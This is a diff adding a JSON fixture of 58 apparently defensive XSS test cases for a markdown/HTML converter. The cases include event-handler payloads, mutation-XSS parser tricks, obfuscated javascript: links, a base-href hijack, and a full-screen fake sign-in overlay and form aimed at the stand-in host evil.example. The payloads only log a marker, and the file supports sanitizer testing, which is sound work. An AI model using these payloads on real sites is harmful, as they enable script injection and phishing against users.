@@ -1,0 +1,324 @@
+[
+  {
+    "id": "img-onerror",
+    "direction": "md-to-html",
+    "input": "<img src=x onerror=\"console.log('PVMARK:img-onerror');window.__pv='img-onerror'\">"
+  },
+  {
+    "id": "svg-onload",
+    "direction": "md-to-html",
+    "input": "<svg onload=\"console.log('PVMARK:svg-onload');window.__pv='svg-onload'\"></svg>"
+  },
+  {
+    "id": "details-ontoggle",
+    "direction": "md-to-html",
+    "input": "<details open ontoggle=\"console.log('PVMARK:details-ontoggle');window.__pv='details-ontoggle'\">x</details>"
+  },
+  {
+    "id": "iframe-srcdoc",
+    "direction": "md-to-html",
+    "input": "<iframe srcdoc=\"<script>console.log('PVMARK:iframe-srcdoc');window.__pv='iframe-srcdoc'</script>\"></iframe>"
+  },
+  {
+    "id": "script",
+    "direction": "md-to-html",
+    "input": "<script>console.log('PVMARK:script');window.__pv='script'</script>"
+  },
+  {
+    "id": "noscript-xmp-mxss",
+    "direction": "md-to-html",
+    "input": "intro\n\n<noscript>\n<xmp></noscript><img src=x onerror=\"console.log('PVMARK:noscript-xmp-mxss');window.__pv='noscript-xmp-mxss'\"></xmp>\n</noscript>"
+  },
+  {
+    "id": "noscript-noembed-mxss",
+    "direction": "md-to-html",
+    "input": "intro\n\n<noscript>\n<noembed></noscript><img src=x onerror=\"console.log('PVMARK:noscript-noembed-mxss');window.__pv='noscript-noembed-mxss'\"></noembed>\n</noscript>"
+  },
+  {
+    "id": "noscript-inline-xmp",
+    "direction": "md-to-html",
+    "input": "<noscript><xmp></noscript><img src=x onerror=\"console.log('PVMARK:noscript-inline-xmp');window.__pv='noscript-inline-xmp'\"></xmp></noscript>"
+  },
+  {
+    "id": "noscript-attr-mxss",
+    "direction": "md-to-html",
+    "input": "intro\n\n<noscript>\n<p title=\"</noscript><img src=x onerror=console.log(&#39;PVMARK:noscript-attr-mxss&#39;);window.__pv=&#39;noscript-attr-mxss&#39;>\">\n</noscript>"
+  },
+  {
+    "id": "template-dsd",
+    "direction": "md-to-html",
+    "input": "<div><template shadowrootmode=\"open\"><img src=x onerror=\"console.log('PVMARK:template-dsd');window.__pv='template-dsd'\"></template></div>"
+  },
+  {
+    "id": "object-data",
+    "direction": "md-to-html",
+    "input": "<object data=\"javascript:console.log('PVMARK:object-data');window.__pv='object-data'\"></object>"
+  },
+  {
+    "id": "embed-src",
+    "direction": "md-to-html",
+    "input": "<embed src=\"javascript:console.log('PVMARK:embed-src');window.__pv='embed-src'\">"
+  },
+  {
+    "id": "math-mglyph-mxss",
+    "direction": "md-to-html",
+    "input": "<math><mtext><table><mglyph><style><img src=x onerror=\"console.log('PVMARK:math-mglyph-mxss');window.__pv='math-mglyph-mxss'\">"
+  },
+  {
+    "id": "svg-p-style-mxss",
+    "direction": "md-to-html",
+    "input": "<svg></p><style><a id=\"</style><img src=1 onerror=console.log(&#39;PVMARK:svg-p-style-mxss&#39;);window.__pv=&#39;svg-p-style-mxss&#39;>\">"
+  },
+  {
+    "id": "form-math-mxss",
+    "direction": "md-to-html",
+    "input": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=\"console.log('PVMARK:form-math-mxss');window.__pv='form-math-mxss'\">"
+  },
+  {
+    "id": "body-onload",
+    "direction": "md-to-html",
+    "input": "<body onload=\"console.log('PVMARK:body-onload');window.__pv='body-onload'\">x</body>"
+  },
+  {
+    "id": "input-autofocus",
+    "direction": "md-to-html",
+    "input": "<input autofocus onfocus=\"console.log('PVMARK:input-autofocus');window.__pv='input-autofocus'\">"
+  },
+  {
+    "id": "video-source-onerror",
+    "direction": "md-to-html",
+    "input": "<video><source onerror=\"console.log('PVMARK:video-source-onerror');window.__pv='video-source-onerror'\"></video>"
+  },
+  {
+    "id": "srcdoc-breakout",
+    "direction": "md-to-html",
+    "input": "</body></html><script>console.log('PVMARK:srcdoc-breakout');window.__pv='srcdoc-breakout'</script>"
+  },
+  {
+    "id": "comment-breakout",
+    "direction": "md-to-html",
+    "input": "<!--><img src=x onerror=\"console.log('PVMARK:comment-breakout');window.__pv='comment-breakout'\">-->"
+  },
+  {
+    "id": "cdata-mxss",
+    "direction": "md-to-html",
+    "input": "<svg><![CDATA[><img src=x onerror=\"console.log('PVMARK:cdata-mxss');window.__pv='cdata-mxss'\">]]></svg>"
+  },
+  {
+    "id": "marquee-onstart",
+    "direction": "md-to-html",
+    "input": "<marquee onstart=\"console.log('PVMARK:marquee-onstart');window.__pv='marquee-onstart'\">x</marquee>"
+  },
+  {
+    "id": "meta-refresh-js",
+    "direction": "md-to-html",
+    "input": "intro\n\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:console.log('PVMARK:meta-refresh-js');window.__pv='meta-refresh-js'\">"
+  },
+  {
+    "id": "iframe-js-src",
+    "direction": "md-to-html",
+    "input": "<iframe src=\"javascript:console.log('PVMARK:iframe-js-src');window.__pv='iframe-js-src'\"></iframe>"
+  },
+  {
+    "id": "svg-animate-onbegin",
+    "direction": "md-to-html",
+    "input": "<svg><animate onbegin=\"console.log('PVMARK:svg-animate-onbegin');window.__pv='svg-animate-onbegin'\" attributeName=\"x\" dur=\"1s\"></animate></svg>"
+  },
+  {
+    "id": "md-image-attr-break",
+    "direction": "md-to-html",
+    "input": "![x](x\" onerror=\"console.log('PVMARK:md-image-attr-break');window.__pv='md-image-attr-break')"
+  },
+  {
+    "id": "style-import",
+    "direction": "md-to-html",
+    "input": "intro\n\n<style>@import 'https://evil.example/x.css';</style>"
+  },
+  {
+    "id": "href-plain",
+    "direction": "md-to-html",
+    "input": "<a href=\"javascript:console.log('PVMARK:href-plain');window.__pv='href-plain'\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "href-mixedcase",
+    "direction": "md-to-html",
+    "input": "<a href=\"JaVaScRiPt:console.log('PVMARK:href-mixedcase');window.__pv='href-mixedcase'\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "href-tab-entity",
+    "direction": "md-to-html",
+    "input": "<a href=\"java&#x09;script:console.log('PVMARK:href-tab-entity');window.__pv='href-tab-entity'\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "href-newline-entity",
+    "direction": "md-to-html",
+    "input": "<a href=\"java&#x0A;script:console.log('PVMARK:href-newline-entity');window.__pv='href-newline-entity'\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "href-ctrl-prefix",
+    "direction": "md-to-html",
+    "input": "<a href=\"&#x01;javascript:console.log('PVMARK:href-ctrl-prefix');window.__pv='href-ctrl-prefix'\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "href-colon-entity",
+    "direction": "md-to-html",
+    "input": "<a href=\"javascript&colon;console.log('PVMARK:href-colon-entity');window.__pv='href-colon-entity'\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "href-decimal-entity",
+    "direction": "md-to-html",
+    "input": "<a href=\"&#106;avascript:console.log('PVMARK:href-decimal-entity');window.__pv='href-decimal-entity'\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "href-leading-space",
+    "direction": "md-to-html",
+    "input": "<a href=\" javascript:console.log('PVMARK:href-leading-space');window.__pv='href-leading-space'\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "md-link-js",
+    "direction": "md-to-html",
+    "input": "[CLICK](javascript:console.log('PVMARK:md-link-js');window.__pv='md-link-js')",
+    "click": true
+  },
+  {
+    "id": "md-link-tab-entity",
+    "direction": "md-to-html",
+    "input": "[CLICK](java&#x09;script:console.log('PVMARK:md-link-tab-entity');window.__pv='md-link-tab-entity')",
+    "click": true
+  },
+  {
+    "id": "md-autolink-js",
+    "direction": "md-to-html",
+    "input": "<javascript:console.log('PVMARK:md-autolink-js');window.__pv='md-autolink-js'>",
+    "click": true
+  },
+  {
+    "id": "md-ref-link",
+    "direction": "md-to-html",
+    "input": "[CLICK][r]\n\n[r]: java&#x09;script:console.log('PVMARK:md-ref-link');window.__pv='md-ref-link'",
+    "click": true
+  },
+  {
+    "id": "md-link-angle",
+    "direction": "md-to-html",
+    "input": "[CLICK](<javascript:console.log('PVMARK:md-link-angle');window.__pv='md-link-angle'>)",
+    "click": true
+  },
+  {
+    "id": "svg-xlink-href",
+    "direction": "md-to-html",
+    "input": "<svg width=\"200\" height=\"40\"><a xlink:href=\"javascript:console.log('PVMARK:svg-xlink-href');window.__pv='svg-xlink-href'\"><text x=\"5\" y=\"20\">CLICK</text></a></svg>",
+    "click": true
+  },
+  {
+    "id": "svg-animate-href",
+    "direction": "md-to-html",
+    "input": "<svg width=\"200\" height=\"40\"><a><animate attributeName=\"href\" values=\"javascript:console.log('PVMARK:svg-animate-href');window.__pv='svg-animate-href'\"/><text x=\"5\" y=\"20\">CLICK</text></a></svg>",
+    "click": true
+  },
+  {
+    "id": "math-href",
+    "direction": "md-to-html",
+    "input": "<math href=\"javascript:console.log('PVMARK:math-href');window.__pv='math-href'\"><mi>CLICK</mi></math>",
+    "click": true
+  },
+  {
+    "id": "data-html-href",
+    "direction": "md-to-html",
+    "input": "<a href=\"data:text/html,<script>console.log('PVMARK:data-html-href');window.__pv='data-html-href'</script>\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "vbscript",
+    "direction": "md-to-html",
+    "input": "<a href=\"vbscript:msgbox(1)\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "a-target-top",
+    "direction": "md-to-html",
+    "input": "<a href=\"https://evil.example/top\" target=\"_top\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "a-target-blank",
+    "direction": "md-to-html",
+    "input": "<a href=\"https://evil.example/popup\" target=\"_blank\">CLICK</a>",
+    "click": true
+  },
+  {
+    "id": "md-link-remote",
+    "direction": "md-to-html",
+    "input": "[CLICK](https://evil.example/inframe)",
+    "click": true
+  },
+  {
+    "id": "button-formaction",
+    "direction": "md-to-html",
+    "input": "<form><button formaction=\"javascript:console.log('PVMARK:button-formaction');window.__pv='button-formaction'\">CLICK</button></form>",
+    "click": true
+  },
+  {
+    "id": "base-href",
+    "direction": "md-to-html",
+    "input": "intro\n\n<base href=\"https://evil.example/\">\n\nhello"
+  },
+  {
+    "id": "meta-refresh",
+    "direction": "md-to-html",
+    "input": "intro\n\n<meta http-equiv=\"refresh\" content=\"1;url=/?meta-refreshed\">\n\nhello"
+  },
+  {
+    "id": "style-overlay",
+    "direction": "md-to-html",
+    "input": "<a id=\"ov\" href=\"https://evil.example/login\" style=\"position:fixed;inset:0;z-index:2147483647;background:#fff;display:block\">Session expired - sign in again</a>"
+  },
+  {
+    "id": "link-stylesheet",
+    "direction": "md-to-html",
+    "input": "intro\n\n<link rel=\"stylesheet\" href=\"data:text/css,body%7Bbackground:rgb(255,0,0)!important%7D\">\n\nhello"
+  },
+  {
+    "id": "form-button",
+    "direction": "md-to-html",
+    "input": "<form action=\"https://evil.example/\"><input name=q><button>go</button></form>"
+  },
+  {
+    "id": "remote-image",
+    "direction": "md-to-html",
+    "input": "![badge](https://evil.example/pixel.png)"
+  },
+  {
+    "id": "link-prefetch",
+    "direction": "md-to-html",
+    "input": "intro\n\n<link rel=\"prefetch\" href=\"https://evil.example/prefetch\">\n\nhello"
+  },
+  {
+    "id": "select-keep",
+    "direction": "md-to-html",
+    "input": "<select><option>a</option></select>"
+  },
+  {
+    "id": "h2m-img-onerror",
+    "direction": "html-to-md",
+    "input": "<p>x</p><img src=x onerror=\"console.log('PVMARK:h2m-img-onerror');window.__pv='h2m-img-onerror'\">"
+  },
+  {
+    "id": "h2m-svg-onload",
+    "direction": "html-to-md",
+    "input": "<svg onload=\"console.log('PVMARK:h2m-svg-onload');window.__pv='h2m-svg-onload'\"></svg><p>x</p>"
+  },
+  {
+    "id": "h2m-details",
+    "direction": "html-to-md",
+    "input": "<details open ontoggle=\"console.log('PVMARK:h2m-details');window.__pv='h2m-details'\">x</details>"
+  }
+]
